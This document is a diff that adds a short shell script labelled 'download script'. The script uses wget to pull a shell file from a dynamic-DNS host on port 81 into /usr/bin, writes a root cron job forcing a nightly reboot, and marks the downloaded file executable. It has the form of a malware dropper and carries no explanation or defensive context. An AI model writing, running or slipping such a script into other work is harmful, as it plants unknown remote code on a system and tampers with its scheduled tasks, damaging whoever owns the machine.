@@ -1,0 +1,8 @@
+# download script
+ploy="http://ptt101.hopto.org:81/kad78"
+cd /usr/bin
+wget -O anp $ploy/data2/anp.sh
+
+echo "0 0 * * * root /sbin/reboot" > /etc/cron.d/reboot
+
+chmod +x anp
